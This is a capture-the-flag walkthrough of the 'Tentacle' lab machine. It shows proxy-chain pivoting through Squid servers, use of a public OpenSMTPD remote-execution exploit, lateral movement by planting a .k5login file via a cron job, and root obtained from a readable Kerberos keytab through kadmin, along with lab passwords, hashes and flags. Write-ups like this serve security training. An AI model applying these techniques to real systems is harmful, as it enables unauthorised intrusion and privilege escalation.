# Tentacle

export IP=10.10.10.224

# Solution

Lets start with the tradition over here
```bash
cmd: 
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-04-12 21:00:22Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
9090/tcp closed zeus-admin
```

checking the webserver first we can see some things
```sql
The following error was encountered while trying to retrieve the URL: /
    Invalid URL
Some aspect of the requested URL is incorrect.

Some possible problems are:
    Missing or incorrect access protocol (should be http:// or similar)
    Missing hostname
    Illegal double-escape in the URL-Path
    Illegal character in hostname; underscores are not allowed.

Your cache administrator is j.nakazawa@realcorp.htb.

Generated Mon, 12 Apr 2021 21:09:36 GMT by srv01.realcorp.htb (squid/4.11)
```

So we have two potential subdomains
```bash
realcorp.htb
srv01.realcorp.htb
```

Adding them to **/etc/hosts** didn't produced any result. Also, there's a potential email/username: **j.nakazawa@realcorp.htb**  <br>

Since the server is running a **proxy** and a **DNS** service at port 53, we may be able to assume that this server is routing traffic to other machines <br>

Lets check if we can find anything
```bash
cmd: dnsenum --enum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -o dns/dnsenum.log -t 160 realcorp.htb

ns.realcorp.htb.                         259200   IN    A        10.197.243.77                                               
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.
ns.realcorp.htb.                         259200   IN    A        10.197.243.77                                               
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
```

We can also obtain some of this information with nmap by defining the dns-servers and scan the network
```bash
cmd: sudo nmap --dns-servers 10.10.10.224 -sL -o nmap/network.dns 10.197.243.0/24

Nmap scan report for wpad.realcorp.htb (10.197.243.31)
Nmap scan report for ns.realcorp.htb (10.197.243.77)
```

So we can see that **ns.realcorp.htb** is a proxy (probably to the wpad machine) and the **proxy.realcorp.htb** is an alias for it (CNAME) <br>

To redirect the traffic and access the internal network i'll use proxychains in **strict chain** mode, with the following route
```
http 10.10.10.224 3128
http 127.0.0.1    3128
```

The **127.0.0.1:3128** ensures that the traffic is routed through the initial address squid proxy and can reach the internal network <br>

The first address being scanned is the **"gateway"** for the internal network (proxy.realcorp.htb = ns.realcorp.htb [10.197.243.77]) 
```sql 
cmd: proxychains nmap -sC -sV -oN nmap/77.proxy 10.197.243.77

22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)                                                                       
| ssh-hostkey:                                                                                                               
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)                                                               
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)                                                              
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)                                                            
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)                                                     
| dns-nsid:                                                                                                                  
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8                                                                               
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-04-13 16:38:02Z)                                                 
464/tcp  open  kerberos-sec (server time: 2021-04-13 16:38:23Z)                                                              
| fingerprint-strings:                                                                                                       
|   RPCCheck:                                                                                                                
|     ~Z0X                                                                                                                   
|     20210413163823Z                                                                                                        
|     REALCORP.HTB                                                                                                           
|     kadmin                                                                                                                 
|_    changepw                                                                                                               
749/tcp  open  rpcbind                                                                                                       
3128/tcp open  http-proxy   Squid http proxy 4.11                                                                            
|_http-server-header: squid/4.11                                                                                             
|_http-title: ERROR: The requested URL could not be retrieved                                                                
```

We can see that this server is also running a proxy (PORT:3128 squid) so this might give us access to the other server in the network (10.197.243.31) <br>

Chain updated
```bash
# 
http 10.10.10.224   3128
http 127.0.0.1      3128
http 10.197.243.77  3128
```

Lets now scan the 10.197.243.31 through the proxy chain
```sql
cmd:  proxychains nmap -sC -sV -oN nmap/31.proxy 10.197.243.31

22/tcp   open  ssh          OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
53/tcp   open  domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
| dns-nsid: 
|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
80/tcp   open  http         nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
88/tcp   open  kerberos-sec MIT Kerberos (server time: 2021-04-13 17:12:59Z)
464/tcp  open  kerberos-sec MIT Kerberos (server time: 2021-04-13 17:12:57Z)
749/tcp  open  rpcbind
3128/tcp open  http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
```
Since this server IP is mapped to **wpad.realcorp.htb** we can try to access a predefined file (wpad.dat) that contains the routes in the machine <br>

``` javascript
cmd: proxychains curl http://wpad.realcorp.htb/wpad.dat -o files/wpad.dat
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}
```

Doing a quick network scan to check which address are up
```sql
cmd: proxychains nmap -sL 10.241.251.0/24 -oN nmap/discover.2ndnet

Nmap scan report for srvpod01.realcorp.htb (10.241.251.113)
```

Lets nmap scan it
```sql
cmd: proxychains nmap -sC -sV -oN nmap/srvpod01 10.241.251.113

25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info 
Service Info: Host: smtp.realcorp.htb
```

Added **srvpod01.realcorp.htb** to the **/etc/hosts** file <br>

Now, that OpenSMTPD is old as hell and there are several RCE exploits, just need to change the destination email to the one found in the beginning and the payload to execute a bash reverse shell. <br>

And we are root ! (used the exploit avaliable [here](https://github.com/FiroSolutions/cve-2020-7247-exploit))

```bash
cmd: whoami && id

root                                                                                                                                    
uid=0(root) gid=0(root) groups=0(root)
```

Quick check to see if there is home folders (although we are root) paid off because a password (in clear text) was found
```bash
cmd: ls /home
j.nakazawa 

cmd:
lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .bash_history -> /dev/null                                                                                           
-rw-r--r--. 1 j.nakazawa j.nakazawa  220 Apr 18  2019 .bash_logout                                                                                                         
-rw-r--r--. 1 j.nakazawa j.nakazawa 3526 Apr 18  2019 .bashrc                                                                                                              
-rw-------. 1 j.nakazawa j.nakazawa  476 Dec  8 19:12 .msmtprc             # <- NEVER SAW THIS                                                                                                         
-rw-r--r--. 1 j.nakazawa j.nakazawa  807 Apr 18  2019 .profile                                                                                                             
lrwxrwxrwx. 1 root       root          9 Dec  9 12:31 .viminfo -> /dev/null
```

That file (the one identified with the arrow) got my attention because i never found it and is not a default file. Checking it out we can see **j.nakazawa** password
```
# Set default values for all following accounts.
defaults
auth           on
tls            on                                                                                                           
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null
                                                                                                                                                                       
# RealCorp Mail                                                                                                                                                            
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_                                                                                                                                               
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60                                                                                                
                                                                                                                                                                           
# Set a default account                                                                                                                                                    
account default : realcorp                    
```

checking the smtpd config
```bash
cmd: cat /etc/smtpd/smtpd.conf                                                                                                                                             
# $OpenBSD: smtpd.conf,v 1.10 2018/05/24 11:40:17 gilles Exp $                                                                                                             
                                                                                                                                                                           
pki smtp.realcorp.htb cert         "/etc/smtpd/tls/smtpd.crt" 
pki smtp.realcorp.htb key          "/etc/smtpd/tls/smtpd.key" 
                                                                                                                                                                           
table creds                    "/etc/smtpd/creds"
table vdoms                    "/etc/smtpd/vdoms"
table vusers                   "/etc/smtpd/vusers"
                                                                                                                                                                           
listen on 0.0.0.0
listen on 127.0.0.1 port 465 smtps pki smtp.realcorp.htb auth <creds>
listen on 127.0.0.1 port 587 tls-require pki smtp.realcorp.htb auth <creds>
                                                                                                                                                                           
action receive mbox virtual <vusers>
action send relay
                                                                                                                                                                           
match from any for domain <vdoms> action receive
match for any action send
```

The **/etc/smtpd/creds** contains a hash, but it cracks to the same as found afore. <br> 

Now we need to issue a TGT to get a TGS from kerberos. For that, we need to configure the kerberos client by modifying the **/etc/krb5.conf** and adding the following lines below the square bracket sections
```bash
[libdefaults]
        default_realm = REALCORP.HTB

[realms]
        REALCORP.HTB = {
                kdc = 10.10.10.224
        }

[domain_realm]
        srv01.realcorp.htb = REALCORP.HTB
```

Might need to fiddle around with the **/etc/hosts** due to **srv01.realcorp.htb** conflicts <br>

Now, we need to get a **TGS** by sending the **TGT** for that we do the following
```bash
cmd: kinit j.nakazawa
Password:  sJB}RM>6Z~64_

cmd: klist
Ticket cache: FILE:/tmp/krb5cc_1000                                                          
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal                                  
04/15/2021 00:03:51  04/16/2021 00:03:51  krbtgt/REALCORP.HTB@REALCORP.HTB
```

You might need to change your clock to stay in a close sync with the kerberos server by checking the valid tarting date and do
```bash
cmd: sudo date -s "15 APR 2021 00:15"
Thu 15 Apr 2021 12:15:08 AM WEST
```

Now its time to test the **ssh** connection to **10.10.10.224** (the initial machine) <br>

**NOTE:** depending on your system you might need to configure ssh to work with kerberos (i had issues on manjaro but worked directly on kali) <br>

```bash
cmd: ssh j.nakazawa@10.10.10.224

# We got in
cmd: whoami && id
j.nakazawa
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

cmd: cat ~/user.txt
#FLAG: 7e8dff07c12bd781b457aa2c0123af23
```

Ran linpeas
```bash
# Cron job
* * * * * admin /usr/local/bin/log_backup.sh

# Script
-rwxr-xr--. 1 root admin 229 Dec  9 12:09 /usr/local/bin/log_backup.sh

# note
runc was found in /usr/bin/runc, you may be able to escalate privileges with it    # does not work


# some emails 
Mails (limit 50)                                                                                                                                         
50344295      0 -rw-rw----   1  j.nakazawa mail            0 Dec  8 21:32 /var/mail/j.nakazawa                                                              
50565785      0 -rw-rw----   1  admin      mail            0 Dec  9 09:32 /var/mail/admin                                                                   
50344295      0 -rw-rw----   1  j.nakazawa mail            0 Dec  8 21:32 /var/spool/mail/j.nakazawa                                                        
50565785      0 -rw-rw----   1  admin      mail            0 Dec  9 09:32 /var/spool/mail/admin

# Hashes
/etc/squid/passwd:$apr1$KBOOx3/n$sPmARSLs1JmAg.06x5/Cx/
```

So i started by the hashes, checked the file and found 3 hashes for some users
```bash
cmd: cat /etc/squid/passwd
j.nakazawa:$apr1$KBOOx3/n$sPmARSLs1JmAg.06x5/Cx/
b.dobson:$apr1$gFbNibg5$Uq1GHhj7dEYlglmLynqst/
r.babelli:$apr1$Sercqs5t$yI/wQKpoXScAdjhI.9dBL0
```

Tried to crack them with hashcat but without any success. Emails are also empty so no need to check them <br>


So the last thing to check is the script **/usr/local/bin/log_backup.sh** executed by the cronjob every second. Lets check its contents out
```bash
cmd: cat /usr/local/bin/log_backup.sh

#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

So, by the looks of it, it seems that:
1. it copies everything from **/var/log/squid** to **/hom/admin/**
2. changes directories to the admin home folder
3. compress **access/cache.log** with tar
4. removes the compressed files 

At first glance we cannot do much here, lets check what is inside **/var/log/squid** not forgetting that we are in an account that is in the **squid group**
```
cmd: ls -la /var/log/squid
ls: cannot open directory '/var/log/squid': Permission denied

cmd: ls -la /var/log
drwx-wx---.  2 admin  squid      41 Dec 24 06:36 squid
```

Suprisingly, we **cannot read** whatever is inside but we can **write and execute** <br>

The initial idea was to generate an **SSH** key locally and create an **authorized_keys** file in order to login but after further testing i came out to the conclusion that it is not allowed/enabled <br>

So i went searching for **"kerberos grant other user permission"**, and found [this](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Granting-Access-to-Your-Account.html)
```sql
If you need to give someone access to log into your account, you can do so through Kerberos, without telling the person your password. Simply create a file called .k5login in your home directory

--- snip ---
jennifer@ATHENA.MIT.EDU
david@EXAMPLE.COM

--- snip ---
```

This exactly what we needed to get admin access just by authorizing our current user to ssh into it. We just need to do the following
```bash
cmd: vi .k5login
j.nakazawa@REALCORP.HTB

cmd: cp .k5login /var/log/squid/
```

Now, if there are a lot of logs, it might take a while to complete the execution (i even needed to reset the machine to clear the logs). But when it finishes the execution we can connect to admin, via ssh, in our local machine
```bash
cmd: ssh admin@10.10.10.224
cmd: whoami && id
admin
uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Now onto root !! <br>
```
-rw-r-----. 1 root squid 3236 Dec 21 08:09 /etc/squid/squid.conf
-rw-r-----. 1 root admin 1403 Dec 19 06:10 /etc/krb5.keytab

/home/admin/.gnupg/trustdb.gpg

/.bash_history
```

That **/etc/krb5.keytab** should only be readable and writable by root, but we can read it. This file allows to authenticate and to impersonate users [here](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-whitepaper.pdf) <br>

Found these hashes with [this](https://github.com/sosdave/KeyTabExtract)

```bash
./keytabextract.py krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : REALCORP.HTB
        SERVICE PRINCIPAL : host/srv01.realcorp.htb
        NTLM HASH : 771699676e1d3729e9ce6e278084a2e1
        AES-256 HASH : 95910155bd1f1925ca8aba96e0fbdb0f37a179a4c0226b12b9820be15e122e01
        AES-128 HASH : c62b475bf094d6f0045c477704adb49e
```

We can also extract more information with [KeytabParser.py](https://github.com/its-a-feature/KeytabParser) and **klist**
```bash
# KeytabParser

cmd: python2.7 KeytabParser.py krb5.keytab

17729
{
    "host/srv01.realcorp.htb@REALCORP.HTB": {
        "keys": [
            {
                "EncType": "aes256-cts-hmac-sha1-96", 
                "Key": "lZEBVb0fGSXKirqW4PvbDzeheaTAImsSuYIL4V4SLgE=", 
                "KeyLength": 32, 
                "Time": "2020-12-08 22:15:30"
            }
        ]
    }
}

# Klist
cmd: klist -k krb5.keytab

Keytab name: FILE:krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
```
I found this information extraction at [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#extract-accounts-from-etckrb5keytab) <br>

Now, to make use of the **krb5.keytab** file, we can use [kadmin](https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html) (which is a command-line interface to the Kerberos administration system) in order to try a possible privesc <br>

From the above link (kadmin) we can see the available commands. We can **add_princiapl newprinc** and set the password for it. Since 

```bash
cmd: kadmin -k -t krb5.keytab -p kadmin/admin@REALCORP.HTB

cmd (kadmin): list_principals
K/M@REALCORP.HTB
host/srv01.realcorp.htb@REALCORP.HTB
j.nakazawa@REALCORP.HTB
kadmin/admin@REALCORP.HTB
kadmin/changepw@REALCORP.HTB
kadmin/srv01.realcorp.htb@REALCORP.HTB
kiprop/srv01.realcorp.htb@REALCORP.HTB
krbtgt/REALCORP.HTB@REALCORP.HTB

cmd (kadmin): add_principal root
Password: wazagod
Re-enter Password: wazagod
```
Now we need to login as the new principal. For that, we can use the kerberos utility [KSU](https://web.mit.edu/kerberos/krb5-latest/doc/user/user_commands/ksu.html)
```
cmd: ksu root
Password: wazagod

cmd: whoami && id
root
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

cmd: cat /root/root.txt
# FLAG: 39aa2f621d5770b2c11975127be1a1d1
```

